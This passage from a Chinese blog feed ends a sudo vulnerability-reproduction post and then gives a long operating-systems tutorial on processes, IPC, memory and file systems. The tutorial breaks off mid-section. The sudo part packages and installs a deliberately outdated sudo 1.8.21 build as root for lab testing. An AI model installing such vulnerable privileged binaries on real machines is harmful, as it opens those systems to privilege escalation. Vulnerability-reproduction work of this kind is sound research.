class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir sudo-custom/DEBIAN -p</span><br><span class="line">mkdir sudo-custom/usr/local/bin -p</span><br><span class="line">vim sudo-custom/DEBIAN/control</span><br></pre></td></tr></table></figure><p>内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Package: sudo-custom</span><br><span class="line">Version: 1.0-1</span><br><span class="line">Architecture: amd64</span><br><span class="line">Maintainer: user*** &lt;pu*****@he***.world&gt;</span><br><span class="line">Description: hello,world</span><br><span class="line">Depends: libc6(&gt;= 2.26)</span><br></pre></td></tr></table></figure><p>继续执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp /root/sudo-1.8.21/src/sudo /root/sudo-custom/usr/local/bin/sudo</span><br><span class="line">cp /root/sudo-1.8.21/src/.libs /root/sudo-custom/usr/local/bin/.libs -r</span><br><span class="line">dpkg-deb -b sudo-custom /root/sudo-custom.deb</span><br><span class="line">dpkg -i sudo-custom.deb</span><br><span class="line">sudo whoami</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h3&gt;&lt;p&gt;在sudo的&lt;code&gt;parse_args()&lt;/code&gt;函数中，重写了&lt;code&gt;argv&lt;/code&gt;，将命令行的参</summary>
      
    
    
    
    
    <category term="漏洞分析" scheme="https://lyi61pd.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    <category term="漏洞复现" scheme="https://lyi61pd.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>操作系统</title>
    <link href="https://lyi61pd.github.io/2025/04/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    <id>https://lyi61pd.github.io/2025/04/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</id>
    <published>2025-04-17T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作系统的基本概念"><a href="#操作系统的基本概念" class="headerlink" title="操作系统的基本概念"></a>操作系统的基本概念</h1><h2 id="什么是操作系统"><a href="#什么是操作系统" class="headerlink" title="什么是操作系统"></a>什么是操作系统</h2><p>操作系统（Operating System，简称 OS）是管理计算机硬件和软件资源的系统程序，是用户与硬件之间的中介。它负责管理 CPU、内存、磁盘、外设等资源，调度任务的执行，并为应用程序提供统一的接口。</p><p>常见的操作系统包括 Linux、Windows、macOS、Android、iOS 等。不同的操作系统在用户体验、系统结构和调度策略上各有差异，但其核心机制大体相似。</p><hr><h2 id="操作系统的主要功能"><a href="#操作系统的主要功能" class="headerlink" title="操作系统的主要功能"></a>操作系统的主要功能</h2><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><p>进程是正在运行的程序实例。操作系统负责创建、调度、终止进程，并提供进程间通信（IPC）机制。多进程系统可以并发运行多个任务，提高资源利用率。</p><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><p>操作系统需要管理所有程序的内存空间，避免冲突，并提供抽象的虚拟地址空间，使得每个程序看似拥有完整的内存。分页、分段、交换空间（Swap）等技术常用于内存管理。</p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>文件系统是组织和存储数据的结构方式。它定义了文件的命名、权限、目录结构、读写方式等。常见的文件系统包括 FAT32、NTFS、ext4 等。</p><h3 id="设备管理"><a href="#设备管理" class="headerlink" title="设备管理"></a>设备管理</h3><p>所有硬件设备如硬盘、网络卡、显示器等都通过驱动程序与操作系统交互。操作系统负责管理这些设备的访问权限、调度和数据传输。</p><h3 id="用户接口"><a href="#用户接口" class="headerlink" title="用户接口"></a>用户接口</h3><p>操作系统提供命令行界面（CLI）或图形用户界面（GUI），作为用户与系统交互的桥梁。例如 bash、cmd、GNOME 等。</p><hr><h1 id="进程管理-1"><a href="#进程管理-1" class="headerlink" title="进程管理"></a>进程管理</h1><h2 id="什么是进程"><a href="#什么是进程" class="headerlink" title="什么是进程"></a>什么是进程</h2><p>进程（Process）是操作系统资源分配的基本单位，是程序在运行时的一个实例。一个程序可以对应多个进程，比如打开多个浏览器窗口，每一个窗口就是一个进程。</p><p>操作系统通过进程来实现多任务运行，每个进程都有自己的地址空间、代码、数据和运行状态。</p><hr><h2 id="进程与程序的区别"><a href="#进程与程序的区别" class="headerlink" title="进程与程序的区别"></a>进程与程序的区别</h2><p>程序是静态的代码文件，是指令和数据的集合，而进程是程序执行时的动态实体。程序可以看作是进程的模板。</p><p>简单说，程序是“静止”的，进程是“活着”的。</p><hr><h2 id="进程的状态"><a href="#进程的状态" class="headerlink" title="进程的状态"></a>进程的状态</h2><p>一个进程在生命周期中通常会经历以下几种状态：</p><ul><li><strong>就绪（Ready）</strong>：进程已准备好运行，等待 CPU 分配时间片。</li><li><strong>运行（Running）</strong>：进程正在使用 CPU 运行指令。</li><li><strong>阻塞（Blocked）</strong>：进程等待某个事件（如 I&#x2F;O 完成）而暂停运行。</li><li><strong>终止（Terminated）</strong>：进程运行结束，资源被回收。</li><li><strong>新建（New）</strong>：刚创建，还未就绪。</li><li><strong>挂起（Suspended）</strong>：被系统暂停，可能因资源限制或人工干预。</li></ul><hr><h2 id="上下文切换（Context-Switch）"><a href="#上下文切换（Context-Switch）" class="headerlink" title="上下文切换（Context Switch）"></a>上下文切换（Context Switch）</h2><p>多进程系统中，操作系统需要在不同进程之间切换 CPU 使用权。为了让切换透明且安全，系统会在切换前保存当前进程的状态（寄存器、程序计数器、堆栈指针等），切换后再恢复另一个进程的状态。</p><p>这种切换过程称为<strong>上下文切换</strong>。虽然切换频繁带来了并发体验，但频繁上下文切换会引起性能损耗。</p><hr><h2 id="线程与进程的关系"><a href="#线程与进程的关系" class="headerlink" title="线程与进程的关系"></a>线程与进程的关系</h2><p>线程（Thread）是比进程更小的执行单元。多个线程可以共享同一个进程的资源（如内存），但它们有自己的栈和寄存器。</p><ul><li>进程是资源分配的单位，线程是 CPU 调度的单位。</li><li>线程切换的开销比进程小，因此多线程常用于高性能并发编程。</li></ul><hr><h2 id="多进程与多线程的对比"><a href="#多进程与多线程的对比" class="headerlink" title="多进程与多线程的对比"></a>多进程与多线程的对比</h2><table><thead><tr><th>特性</th><th>多进程</th><th>多线程</th></tr></thead><tbody><tr><td>内存空间</td><td>每个进程独立</td><td>同一进程的线程共享空间</td></tr><tr><td>创建开销</td><td>较大</td><td>较小</td></tr><tr><td>通信方式</td><td>使用进程间通信（IPC）</td><td>直接共享内存，需同步控制</td></tr><tr><td>稳定性</td><td>一个进程崩溃不会影响其他</td><td>一个线程崩溃可能影响整个进程</td></tr><tr><td>适用场景</td><td>安全隔离、重任务分工</td><td>轻量级并发、高 IO 效率</td></tr></tbody></table><hr><h2 id="进程调度算法"><a href="#进程调度算法" class="headerlink" title="进程调度算法"></a>进程调度算法</h2><p>操作系统在多个进程之间分配 CPU 的方式称为调度。不同的调度算法适用于不同场景：</p><ul><li><strong>先来先服务（FCFS）</strong>：按进程到达顺序排队处理，简单但不公平。</li><li><strong>短作业优先（SJF）</strong>：优先处理运行时间短的任务，平均等待时间短，但可能饿死长任务。</li><li><strong>时间片轮转（RR）</strong>：给每个进程分配固定时间片，公平性好，适合分时系统。</li><li><strong>优先级调度</strong>：按优先级执行高的进程，易导致低优先级进程长时间等待。</li><li><strong>多级反馈队列（MLFQ）</strong>：动态调整进程优先级，综合考虑响应时间和公平性，复杂但实用。</li><li><strong>完全公平调度（CFS）</strong>：CFS 通过维护一个 <strong>红黑树</strong> 来管理所有可执行进程。每个进程会根据其 <strong>虚拟运行时间</strong>（也称为“权重”或“时间片”）被放置在红黑树中，进程的虚拟运行时间越小，越先被调度执行。Linux默认采用该算法。CFS 设计的目标是确保每个进程（或线程）都能公平地共享 CPU 时间，从而实现较为平衡的性能表现，特别是对于多核和多线程的环境</li></ul><hr><h2 id="进程间通信（IPC）"><a href="#进程间通信（IPC）" class="headerlink" title="进程间通信（IPC）"></a>进程间通信（IPC）</h2><p>当多个进程需要协作时，就必须进行通信。常见的通信方式包括：</p><ul><li><strong>管道（Pipe）</strong>：一种半双工通信机制，只能在父子进程之间使用。</li><li><strong>命名管道（FIFO）</strong>：增强版的管道，支持不相关进程间通信。</li><li><strong>消息队列</strong>：进程以消息为单位进行通信，系统管理消息缓冲区。</li><li><strong>共享内存</strong>：最高效的通信方式，多个进程访问同一块物理内存，但需要加锁同步。</li><li><strong>信号量</strong>：主要用于同步机制，避免竞争条件。</li><li><strong>套接字（Socket）</strong>：支持不同主机之间的进程通信。</li></ul><hr><h2 id="同步与互斥"><a href="#同步与互斥" class="headerlink" title="同步与互斥"></a>同步与互斥</h2><p>当多个线程或进程共享资源时，必须保证数据一致性，避免“竞态条件”（Race Condition）。这需要使用同步和互斥机制：</p><ul><li><strong>互斥锁（Mutex）</strong>：一段代码在同一时刻只能被一个线程访问。</li><li><strong>信号量（Semaphore）</strong>：一种计数锁，可以控制访问某资源的线程数。</li><li><strong>自旋锁（Spinlock）</strong>：不断尝试获取锁，适合锁持有时间短的场景。</li><li><strong>条件变量</strong>：配合锁使用，实现复杂的等待-唤醒机制。</li></ul><hr><h1 id="进程间通信（IPC）-1"><a href="#进程间通信（IPC）-1" class="headerlink" title="进程间通信（IPC）"></a>进程间通信（IPC）</h1><p>在多进程系统中，不同的进程运行在独立的内存空间中，默认情况下彼此之间无法直接访问对方的数据。然而，实际应用中很多任务都需要多个进程协作完成，这就必须依赖进程间通信机制（IPC）来交换数据、传递信号或同步行为。</p><p>操作系统提供了多种 IPC 方法，不同的方法适用于不同的场景，权衡了效率、复杂度和安全性。</p><hr><h2 id="IPC-的典型用途"><a href="#IPC-的典型用途" class="headerlink" title="IPC 的典型用途"></a>IPC 的典型用途</h2><ul><li>数据传输：在进程之间传递数据，例如图像处理中的主进程和工作进程。</li><li>事件通知：某进程完成任务后通知另一个进程，如 GUI 与后台服务的交互。</li><li>资源共享：多个进程共同使用某个资源时，通过同步机制避免冲突。</li><li>进程控制：父进程控制子进程的行为，如终止、暂停、唤醒等。</li></ul><hr><h2 id="常见的进程间通信方式"><a href="#常见的进程间通信方式" class="headerlink" title="常见的进程间通信方式"></a>常见的进程间通信方式</h2><h3 id="管道（Pipe）"><a href="#管道（Pipe）" class="headerlink" title="管道（Pipe）"></a>管道（Pipe）</h3><p>管道是一种最基础的 IPC 方式，只能在<strong>有亲缘关系的进程之间使用</strong>，如父子进程。</p><ul><li>单向传输，数据只能从写端流向读端。</li><li>典型用法：<code>ls | grep &quot;txt&quot;</code>，Shell 会创建两个进程，用管道连接它们的输出和输入。</li></ul><p><strong>系统调用：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span> fd[<span class="number">2</span>])</span>;</span><br></pre></td></tr></table></figure><p><code>fd[0]</code> 是读端，<code>fd[1]</code> 是写端。</p><h3 id="命名管道（FIFO）"><a href="#命名管道（FIFO）" class="headerlink" title="命名管道（FIFO）"></a>命名管道（FIFO）</h3><p>命名管道是管道的增强版本，<strong>允许无血缘关系的进程通信</strong>，通过文件系统中的特殊文件来标识。</p><ul><li>数据读写像文件操作一样进行。</li><li>可以跨进程、甚至跨 Shell 通信。</li><li>使用 <code>mkfifo()</code> 或 <code>mknod()</code> 创建。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> /tmp/myfifo</span><br></pre></td></tr></table></figure><h3 id="消息队列（Message-Queue）"><a href="#消息队列（Message-Queue）" class="headerlink" title="消息队列（Message Queue）"></a>消息队列（Message Queue）</h3><p>消息队列允许进程以<strong>消息为单位异步通信</strong>。内核负责缓存消息，进程读取时按消息顺序或优先级读取。</p><ul><li>支持多生产者、多消费者模型。</li><li>消息结构化，通信可靠。</li><li>不共享内存，较安全。</li></ul><p><strong>系统调用：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgget(), msgsnd(), msgrcv(), msgctl()</span><br></pre></td></tr></table></figure><h3 id="共享内存（Shared-Memory）"><a href="#共享内存（Shared-Memory）" class="headerlink" title="共享内存（Shared Memory）"></a>共享内存（Shared Memory）</h3><p>共享内存将一块物理内存映射到多个进程的地址空间，是<strong>效率最高</strong>的一种通信方式。</p><ul><li>多个进程可以同时读写共享区域，适合高频数据交换。</li><li>通常需要配合信号量或互斥锁来同步访问，避免数据竞争。</li><li>适合大数据量的传输场景，如图像处理、视频编码等。</li></ul><p><strong>系统调用：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shmget(), shmat(), shmdt(), shmctl()</span><br></pre></td></tr></table></figure><h3 id="信号量（Semaphore）"><a href="#信号量（Semaphore）" class="headerlink" title="信号量（Semaphore）"></a>信号量（Semaphore）</h3><p>信号量并不直接传输数据，而是用于实现<strong>进程间的同步与互斥控制</strong>。</p><ul><li>类似交通红绿灯，控制进程对共享资源的访问。</li><li>信号量可与共享内存搭配使用，实现高效且安全的通信。</li></ul><p><strong>系统调用：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">semget(), semop(), semctl()</span><br></pre></td></tr></table></figure><h3 id="信号（Signal）"><a href="#信号（Signal）" class="headerlink" title="信号（Signal）"></a>信号（Signal）</h3><p>信号是一种轻量级的通知机制，操作系统通过信号向进程传递事件通知。</p><ul><li>类似中断，用于处理如中止、超时、非法访问等事件。</li><li>常见信号有 <code>SIGINT</code>（Ctrl+C）、<code>SIGKILL</code>、<code>SIGTERM</code> 等。</li><li>可自定义信号处理函数，使用 <code>signal()</code> 或 <code>sigaction()</code> 注册。</li></ul><h3 id="套接字（Socket）"><a href="#套接字（Socket）" class="headerlink" title="套接字（Socket）"></a>套接字（Socket）</h3><p>套接字支持<strong>不同主机或本机任意进程之间的通信</strong>，是构建网络通信的基础。</p><ul><li>分为**本地套接字（Unix Domain Socket）<strong><strong>和</strong></strong>网络套接字（TCP&#x2F;UDP）**。</li><li>本地套接字用于同一台机器内的进程通信，性能高于 TCP 套接字。</li><li>网络套接字支持跨主机通信，是分布式系统通信的核心方式。</li></ul><p><strong>系统调用：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(), bind(), listen(), accept(), connect(), send(), recv()</span><br></pre></td></tr></table></figure><p>socket有多种不同类型，比如常见的<code>ip:port</code>是网络套接字</p><table><thead><tr><th>socket 类型</th><th>地址格式</th><th>用途</th></tr></thead><tbody><tr><td><code>AF_INET</code></td><td><code>IP:PORT</code></td><td>IPv4 网络通信</td></tr><tr><td><code>AF_INET6</code></td><td><code>[IPv6]:PORT</code></td><td>IPv6 网络通信</td></tr><tr><td><code>AF_UNIX</code> &#x2F; <code>AF_LOCAL</code></td><td>文件路径（如 <code>/tmp/mysock</code>）</td><td>本地进程通信（IPC）</td></tr><tr><td><code>AF_PACKET</code></td><td>网络接口 + 协议</td><td>底层网络抓包（如 Wireshark）</td></tr><tr><td><code>AF_BLUETOOTH</code></td><td>MAC 地址 + 通道</td><td>蓝牙通信</td></tr><tr><td><code>AF_NETLINK</code></td><td>内核通信通道</td><td>Linux 内核与用户空间通信</td></tr></tbody></table><hr><h2 id="实际开发中如何选择-IPC-方式"><a href="#实际开发中如何选择-IPC-方式" class="headerlink" title="实际开发中如何选择 IPC 方式"></a>实际开发中如何选择 IPC 方式</h2><ul><li>对于高频大数据传输：优先使用共享内存 + 同步机制</li><li>对于结构化、可靠消息传递：使用消息队列或本地套接字</li><li>对于跨主机通信：使用网络套接字（如 TCP）</li><li>对于简单通知或事件触发：使用信号或信号量</li><li>父子进程间传输：使用管道或共享内存</li><li>多线程通信：直接共享内存，配合互斥锁或条件变量</li></ul><hr><h1 id="内存管理-1"><a href="#内存管理-1" class="headerlink" title="内存管理"></a>内存管理</h1><h2 id="内存管理的作用"><a href="#内存管理的作用" class="headerlink" title="内存管理的作用"></a>内存管理的作用</h2><p>内存管理的目标是高效、安全、合理地分配系统内存资源。现代操作系统通过内存管理机制，让每个进程都以为自己拥有完整的独立内存空间，实际上却在后台进行着复杂的资源调度和地址映射。</p><p>内存管理不仅负责分配和回收内存，还必须处理内存保护、共享、虚拟化等需求。</p><hr><h2 id="地址空间与地址类型"><a href="#地址空间与地址类型" class="headerlink" title="地址空间与地址类型"></a>地址空间与地址类型</h2><h3 id="逻辑地址（虚拟地址）"><a href="#逻辑地址（虚拟地址）" class="headerlink" title="逻辑地址（虚拟地址）"></a>逻辑地址（虚拟地址）</h3><p>逻辑地址是由程序生成的地址，也叫虚拟地址。在程序中访问内存时，使用的就是逻辑地址。</p><h3 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h3><p>物理地址是真正被映射到内存芯片上的地址，由硬件识别。操作系统通过内存管理单元（MMU）将逻辑地址转换成物理地址。</p><h3 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h3><ul><li><strong>逻辑地址空间</strong>：进程能看到的内存范围。</li><li><strong>物理地址空间</strong>：实际硬件可用的内存范围。</li></ul><p>每个进程有独立的逻辑地址空间，操作系统通过地址转换机制将其映射到共享的物理内存上。</p><hr><h2 id="分段（Segmentation）"><a href="#分段（Segmentation）" class="headerlink" title="分段（Segmentation）"></a>分段（Segmentation）</h2><p>分段是一种将逻辑地址空间划分为多个“逻辑单元”的方法，比如代码段、数据段、堆、栈等。</p><ul><li>每段具有独立的基址和长度。</li><li>程序更容易实现模块化管理。</li><li>缺点是段长不固定，容易产生<strong>外部碎片</strong>。</li></ul><p>分段常用于早期操作系统或嵌入式系统，在现代系统中通常结合分页一起使用。</p><p><img src="/blog_imgs/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1744796674197-5bc113a6-e168-4e5f-8cfa-24e10af5889c.png"></p><hr><h2 id="分页（Paging）"><a href="#分页（Paging）" class="headerlink" title="分页（Paging）"></a>分页（Paging）</h2><p>分页是将<strong>物理内存和逻辑内存都划分成等大小的固定块</strong>，分别叫做：</p><ul><li>页（Page）：逻辑内存单位</li><li>帧（Frame）：物理内存单位</li></ul><p>操作系统维护一个<strong>页表（Page Table）</strong>，用于将每个页映射到对应的帧，解决了分段带来的外部碎片问题。</p><ul><li>每个进程都有自己的页表</li><li>地址转换过程由 MMU 自动完成</li></ul><h3 id="地址转换过程"><a href="#地址转换过程" class="headerlink" title="地址转换过程"></a>地址转换过程</h3><p>逻辑地址 &#x3D; 页号 + 页内偏移<br>查页表得到帧号，组合成物理地址。</p><hr><h2 id="虚拟内存（Virtual-Memory）"><a href="#虚拟内存（Virtual-Memory）" class="headerlink" title="虚拟内存（Virtual Memory）"></a>虚拟内存（Virtual Memory）</h2><p>虚拟内存是操作系统通过分页机制提供的一种内存扩展技术。即使物理内存不足，也可以通过将部分内存页暂存到磁盘（称为<strong>交换空间</strong>或 Swap）来继续执行程序。</p><ul><li>提供了比实际物理内存更大的地址空间</li><li>支持按需调页，程序启动时不需要全部加载到内存</li><li>支持内存共享和内存保护机制</li></ul><hr><h2 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h2><p>当内存不足，必须将一部分内存页换出磁盘，空出空间加载新页，这称为<strong>页面置换</strong>。操作系统使用页面置换算法来决定“淘汰哪一页”。</p><p>常见算法包括：</p><h3 id="FIFO（先进先出）"><a href="#FIFO（先进先出）" class="headerlink" title="FIFO（先进先出）"></a>FIFO（先进先出）</h3><p>最早进入内存的页最先被换出，简单但效率不佳，容易出现 Belady 异常（缓存更大反而更差）。</p><h3 id="LRU（最近最少使用）"><a href="#LRU（最近最少使用）" class="headerlink" title="LRU（最近最少使用）"></a>LRU（最近最少使用）</h3><p>淘汰最近最少使用的页，基于访问历史，命中率高，但实现复杂，通常需要硬件支持或近似算法。</p><h3 id="Clock（时钟算法）"><a href="#Clock（时钟算法）" class="headerlink" title="Clock（时钟算法）"></a>Clock（时钟算法）</h3><p>一种 LRU 的近似实现，使用一个“指针”遍历页表，查看是否被访问过，没访问的就换出。</p><hr><h2 id="内存分配策略"><a href="#内存分配策略" class="headerlink" title="内存分配策略"></a>内存分配策略</h2><p>操作系统在分配内存块时，也使用了不同的策略：</p><ul><li><strong>首次适配（First Fit）</strong>：从头开始找第一个够用的空闲块</li><li><strong>最佳适配（Best Fit）</strong>：找最接近所需大小的空闲块，减少碎片</li><li><strong>最差适配（Worst Fit）</strong>：找最大的空闲块，预留更多剩余空间</li></ul><p>这些策略都面临一个问题：<strong>内存碎片</strong>，包括：</p><ul><li><strong>外部碎片</strong>：空闲块分布零散，总空间够但连续不够</li><li><strong>内部碎片</strong>：分配的块比实际需求大，造成浪费</li></ul><p>分页能很好地解决这两个问题，但会带来页表维护开销。</p><hr><h2 id="多级页表与快表（TLB）"><a href="#多级页表与快表（TLB）" class="headerlink" title="多级页表与快表（TLB）"></a>多级页表与快表（TLB）</h2><p>在分页系统中，页表过大时会引起访问效率下降。为了解决这个问题，操作系统引入了：</p><ul><li><strong>多级页表</strong>：将页表本身分页，分层管理，节省内存空间</li><li><strong>TLB（Translation Lookaside Buffer）</strong>：一种缓存页表项的高速缓冲区，提升地址转换速度</li></ul><p>如果页表命中 TLB，地址转换非常快；如果未命中，就需要多次内存访问。</p><hr><h2 id="内存保护与共享"><a href="#内存保护与共享" class="headerlink" title="内存保护与共享"></a>内存保护与共享</h2><p>现代操作系统通过 MMU 提供内存保护机制：</p><ul><li>每个进程只能访问自己的地址空间</li><li>通过设置页表项中的访问权限，实现读写保护</li><li>共享内存（如动态链接库）可以被多个进程映射到相同的物理帧上，提升内存利用率</li></ul><hr><h2 id="典型案例：Linux-内存结构"><a href="#典型案例：Linux-内存结构" class="headerlink" title="典型案例：Linux 内存结构"></a>典型案例：Linux 内存结构</h2><p>在 Linux 中，每个进程的虚拟地址空间大致如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">---------------------</span><br><span class="line">内核空间</span><br><span class="line">---------------------</span><br><span class="line">用户堆栈（Stack）</span><br><span class="line">共享库（.so）</span><br><span class="line">堆（Heap）</span><br><span class="line">未初始化数据段（.bss）</span><br><span class="line">初始化数据段（.data）</span><br><span class="line">代码段（.text）</span><br><span class="line">---------------------</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure><p>堆向上增长，栈向下增长，这样可以更好地利用地址空间。</p><hr><h1 id="文件系统-1"><a href="#文件系统-1" class="headerlink" title="文件系统"></a>文件系统</h1><h2 id="文件系统的作用"><a href="#文件系统的作用" class="headerlink" title="文件系统的作用"></a>文件系统的作用</h2><p>文件系统是操作系统中负责管理和存储数据的子系统，其核心目标是为用户提供一种<strong>抽象、统一、安全、高效</strong>的数据访问方式。</p><p>通过文件系统，用户可以方便地创建、读取、修改、删除文件和目录，而无需关心底层磁盘的组织方式。</p><hr><h2 id="文件的逻辑结构"><a href="#文件的逻辑结构" class="headerlink" title="文件的逻辑结构"></a>文件的逻辑结构</h2><p>从操作系统角度看，文件是<strong>逻辑上的字节序列</strong>，可以是文本、图片、程序、数据库文件等。文件通常包括以下信息：</p><ul><li><strong>文件数据</strong>：实际内容</li><li><strong>元数据（Metadata）</strong>：描述文件的属性，如文件名、大小、创建时间、权限等</li></ul><hr><h2 id="文件目录组织"><a href="#文件目录组织" class="headerlink" title="文件目录组织"></a>文件目录组织</h2><p>为了便于管理大量文件，操作系统使用目录结构进行层级分类。常见目录结构包括：</p><h3 id="单层目录结构"><a href="#单层目录结构" class="headerlink" title="单层目录结构"></a>单层目录结构</h3><p>所有文件存储在一个目录下，简单但混乱，不适合多用户系统。</p><h3 id="二级目录结构"><a href="#二级目录结构" class="headerlink" title="二级目录结构"></a>二级目录结构</h3><p>每个用户一个独立目录，解决了命名冲突，但目录层级仍然不够丰富。</p><h3 id="树形目录结构（现代系统通用）"><a href="#树形目录结构（现代系统通用）" class="headerlink" title="树形目录结构（现代系统通用）"></a>树形目录结构（现代系统通用）</h3><p>支持多层嵌套子目录，灵活且可扩展。路径分为：</p><ul><li><strong>绝对路径</strong>：从根目录 <code>/</code> 开始，如 <code>/home/user***/docs</code></li><li><strong>相对路径</strong>：基于当前目录，如 <code>../images</code></li></ul><hr><h2 id="inode（索引节点）"><a href="#inode（索引节点）" class="headerlink" title="inode（索引节点）"></a>inode（索引节点）</h2><p>Linux 等类 Unix 系统中，每个文件都有一个唯一的<strong>索引节点（inode）</strong>，用于记录文件的元数据和磁盘位置。</p><p>inode 包含以下信息：</p><ul><li>文件类型（普通文件、目录、符号链接等）</li><li>文件权限（rwx）</li><li>所有者 UID、组 GID</li><li>创建、访问、修改时间</li><li>文件大小</li><li>指向数据块的指针</li></ul><p>文件名和 inode 是分离的。多个文件名可以指向同一个 inode（硬链接）。</p><hr><h2 id="文件的访问权限"><a href="#文件的访问权限" class="headerlink" title="文件的访问权限"></a>文件的访问权限</h2><p>Unix 系统使用<strong>三类用户 + 三种权限</strong>的模型：</p><ul><li>用户类型：<ul><li>所有者（User）</li><li>所在组（Group）</li><li>其他用户（Others）</li></ul></li><li>权限类型：<ul><li>读（r）：查看文件内容或目录列表</li><li>写（w）：修改文件内容或目录结构</li><li>执行（x）：运行文件或进入目录</li></ul></li></ul><p>例如权限串 <code>-rw-r--r--</code> 表示一个普通文件，拥有者可读写，组和其他用户只读。</p><hr><h2 id="磁盘空间的分配方式"><a href="#磁盘空间的分配方式" class="headerlink" title="磁盘空间的分配方式"></a>磁盘空间的分配方式</h2><p>文件的数据被存储在磁盘块（block）中，磁盘块的分配方式会影响读写性能和碎片率：</p><h3 id="连续分配"><a href="#连续分配" class="headerlink" title="连续分配"></a>连续分配</h3><p>文件占用连续的磁盘块，读写性能高，但不利于文件扩展，容易产生外部碎片。</p><h3 id="链式分配"><a href="#链式分配" class="headerlink" title="链式分配"></a>链式分配</h3><p>每个磁盘块中记录下一个块的地址，文件可任意扩展，但随机访问性能差。</p><h3 id="索引分配"><a href="#索引分配" class="headerlink" title="索引分配"></a>索引分配</h3><p>每个文件有一个索引块，记录所有数据块的地址，灵活且易于管理，是现代文件系统的主流方式。</p><hr><h2 id="常见文件系统类型"><a href="#常见文件系统类型" class="headerlink" title="常见文件系统类型"></a>常见文件系统类型</h2><h3 id="FAT（File-Allocation-Table）"><a href="#FAT（File-Allocation-Table）" class="headerlink" title="FAT（File Allocation Table）"></a>FAT（File Allocation Table）</h3><ul><li>早期 Windows 使用，简单但易碎片化</li><li>无权限管理机制，适合 U 盘、存储卡等移动设备</li></ul><h3 id="NTFS（Windows-默认）"><a href="#NTFS（Windows-默认）" class="headerlink" title="NTFS（Windows 默认）"></a>NTFS（Windows 默认）</h3><ul><li>支持权限控制、日志、压缩、加密等特性</li><li>稳定性和扩展性好，适用于大型存储系统</li></ul><h3 id="ext-系列（Linux）"><a href="#ext-系列（Linux）" class="headerlink" title="ext 系列（Linux）"></a>ext 系列（Linux）</h3><ul><li><code>ext3</code>：支持日志机制</li><li><code>ext4</code>：支持大文件、文件系统检查更快，广泛应用于 Linux 发行版</li></ul><h3 id="XFS、ZFS、Btrfs-等"><a href="#XFS、ZFS、Btrfs-等" class="headerlink" title="XFS、ZFS、Btrfs 等"></a>XFS、ZFS、Btrfs 等</h3><ul><li>更现代的文件系统，支持快照、复制、自动修复等高级特性，适用于云计算和企业环境</li></ul><hr><h2 id="缓存与写入机制"><a href="#缓存与写入机制" class="headerlink" title="缓存与写入机制"></a>缓存与写入机制</h2><p>操作系统并不会每次写入都直接同步到磁盘，而是使用<strong>缓存机制</strong>提升性能：</p><ul><li><strong>页缓存（Page Cache）</strong>：内存中保存文件内容</li><li><strong>写回机制（Write-back）</strong>：延迟写入，提高效率</li><li><strong>写通机制（Write-through）</strong>：写操作同步写入磁盘，更安全但性能差</li></ul><p>可以使用 <code>fsync()</code> 或 <code>sync</code> 命令强制刷新缓存。</p><hr><h2 id="符号链接与硬链接"><a href="#符号链接与硬链接" class="headerlink" title="符号链接与硬链接"></a>符号链接与硬链接</h2><h3 id="硬链接（Hard-Link）"><a href="#硬链接（Hard-Link）" class="headerlink" title="硬链接（Hard Link）"></a>硬链接（Hard Link）</h3><ul><li>多个文件名指向同一个 inode</li><li>删除任意一个不会影响其他链接</li><li>不能跨文件系统或对目录使用</li></ul><h3 id="符号链接（Symbolic-Link）"><a href="#符号链接（Symbolic-Link）" class="headerlink" title="符号链接（Symbolic Link）"></a>符号链接（Symbolic 